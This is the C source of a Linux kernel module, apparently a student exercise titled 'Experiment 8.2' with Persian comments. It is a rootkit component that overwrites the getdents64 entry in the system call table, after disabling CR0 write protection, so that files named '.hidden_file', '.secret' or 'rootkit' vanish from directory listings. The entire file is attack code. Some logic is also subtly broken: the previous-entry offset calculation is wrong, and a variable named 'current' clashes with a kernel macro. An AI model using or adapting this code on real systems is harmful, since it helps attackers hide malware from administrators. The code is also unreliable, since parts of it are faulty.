#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <asm/syscall.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Student");
MODULE_DESCRIPTION("Hook getdents64 to hide files - Experiment 8.2");

typedef long (*syscall_fn_t)(const struct pt_regs *);
static void **sys_call_table = NULL;
static syscall_fn_t original_getdents64 = NULL;

/* فایل‌هایی که پنهان می‌شوند */
static const char *hidden_files[] = {
    ".hidden_file",
    ".secret",
    "rootkit",
    NULL
};

static int should_hide(const char *name)
{
    int i;
    if (!name) return 0;
    
    for (i = 0; hidden_files[i] != NULL; i++) {
        if (strcmp(name, hidden_files[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

static long hooked_getdents64(const struct pt_regs *regs)
{
    int fd = regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    unsigned int count = regs->dx;
    
    long ret, actual_ret;
    struct linux_dirent64 *dirent_ker = NULL;
    char *buffer = NULL;
    int i = 0;
    
    /* فراخوانی اصلی syscall */
    ret = original_getdents64(regs);
    
    if (ret <= 0)
        return ret;
    
    actual_ret = ret;
    
    /* تخصیص buffer در kernel */
    buffer = kmalloc(ret, GFP_KERNEL);
    if (!buffer) {
        printk(KERN_ERR "[-] kmalloc failed\n");
        return ret;
    }
    
    /* کپی کردن داده‌ها از userspace */
    if (copy_from_user(buffer, dirent, ret)) {
        printk(KERN_ERR "[-] copy_from_user failed\n");
        kfree(buffer);
        return ret;
    }
    
    /* فیلتر کردن entries */
    dirent_ker = (struct linux_dirent64 *)buffer;
    
    while (i < ret) {
        struct linux_dirent64 *current = (struct linux_dirent64 *)(buffer + i);
        unsigned short reclen = current->d_reclen;
        
        if (reclen == 0)
            break;
        
        /* چک کردن آیا این entry باید پنهان شود */
        if (should_hide(current->d_name)) {
            printk(KERN_INFO "[+] Hiding: %s\n", current->d_name);
            
            /* حذف این entry با تعدیل reclen entry قبلی */
            if (i == 0) {
                /* اگر entry اول باشد، تمام entries بعدی را shift کنید */
                memmove(buffer + i, buffer + i + reclen, ret - i - reclen);
                ret -= reclen;
                actual_ret -= reclen;
                continue;
            } else {
                /* اگر entry اول نباشد، reclen entry قبلی را تعدیل کنید */
                struct linux_dirent64 *prev = (struct linux_dirent64 *)
                    (buffer + i - ((struct linux_dirent64 *)(buffer + i - 1))->d_reclen);
                prev->d_reclen += reclen;
                ret -= reclen;
                actual_ret -= reclen;
                continue;
            }
        }
        
        i += reclen;
    }
    
    /* کپی کردن داده‌های تعدیل شده به userspace */
    if (copy_to_user(dirent, buffer, ret)) {
        printk(KERN_ERR "[-] copy_to_user failed\n");
        kfree(buffer);
        return actual_ret;
    }
    
    kfree(buffer);
    
    /* بازگرداندن اندازه تعدیل شده */
    return ret;
}

static unsigned long get_syscall_table_addr(void)
{
    unsigned long addr = kallsyms_lookup_name("sys_call_table");
    if (!addr) {
        printk(KERN_ERR "[-] Could not find sys_call_table\n");
        return 0;
    }
    return addr;
}

/* غیرفعال کردن Write Protection (CR0 bit 16) */
static inline void disable_wp(void)
{
    unsigned long cr0;
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    printk(KERN_INFO "[+] Write protection disabled\n");
}

/* فعال کردن Write Protection */
static inline void enable_wp(void)
{
    unsigned long cr0;
    cr0 = read_cr0();
    write_cr0(cr0 | X86_CR0_WP);
    printk(KERN_INFO "[+] Write protection enabled\n");
}

static int __init hook_init(void)
{
    unsigned long table_addr;
    syscall_fn_t *syscall_ptr;
    
    printk(KERN_INFO "[+] Experiment 8.2: Hook Module Loading...\n");
    
    /* یافتن جدول syscall */
    table_addr = get_syscall_table_addr();
    if (!table_addr) {
        return -EFAULT;
    }
    
    sys_call_table = (void **)table_addr;
    printk(KERN_INFO "[+] sys_call_table at: 0x%lx\n", table_addr);
    
    /* getdents64 - syscall شماره 217 روی x86_64 */
    original_getdents64 = (syscall_fn_t)sys_call_table[217];
    printk(KERN_INFO "[+] Original getdents64 at: 0x%lx\n", 
           (unsigned long)original_getdents64);
    
    /* Hook کردن syscall */
    disable_wp();
    
    syscall_ptr = (syscall_fn_t *)&sys_call_table[217];
    *syscall_ptr = hooked_getdents64;
    
    enable_wp();
    
    printk(KERN_INFO "[+] getdents64 hooked successfully\n");
    printk(KERN_INFO "[+] Hidden files: .hidden_file, .secret, rootkit\n");
    
    return 0;
}

static void __exit hook_exit(void)
{
    syscall_fn_t *syscall_ptr;
    
    if (!sys_call_table || !original_getdents64) {
        printk(KERN_ERR "[-] Module not properly initialized\n");
        return;
    }
    
    printk(KERN_INFO "[-] Restoring original getdents64...\n");
    
    disable_wp();
    
    syscall_ptr = (syscall_fn_t *)&sys_call_table[217];
    *syscall_ptr = original_getdents64;
    
    enable_wp();
    
    printk(KERN_INFO "[-] Experiment 8.2: Hook Module Unloaded\n");
}

module_init(hook_init);
module_exit(hook_exit);
